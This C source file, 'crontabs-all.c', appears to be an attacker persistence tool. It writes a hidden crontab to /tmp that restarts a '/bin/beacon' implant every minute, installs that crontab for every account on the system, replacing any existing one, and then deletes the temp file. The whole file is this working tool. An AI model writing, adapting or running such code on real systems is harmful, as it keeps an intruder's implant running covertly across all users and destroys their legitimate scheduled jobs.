/* crontabs-all.c -- add cronjobs for all users */

#include <pwd.h>
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>


int main(int argc, char *argv[]) {
  struct passwd *pwd;
  FILE *cronjob;

  cronjob = fopen("/tmp/.cronjoblol", "w");
  if (cronjob == NULL)
    return EXIT_FAILURE;

  fputs("* * * * * killall -9 beacon && /bin/beacon\n"
	"* * * * * id\n",
	cronjob);

  fclose(cronjob);
  while((pwd = getpwent()) != NULL) {
    char cmd[1024];

    snprintf(cmd, sizeof(cmd), "/usr/bin/crontab -u %s /tmp/.cronjoblol",
	     pwd->pw_name);
    system(cmd);
  }

  unlink("/tmp/.cronjoblol");

  return EXIT_SUCCESS;
}
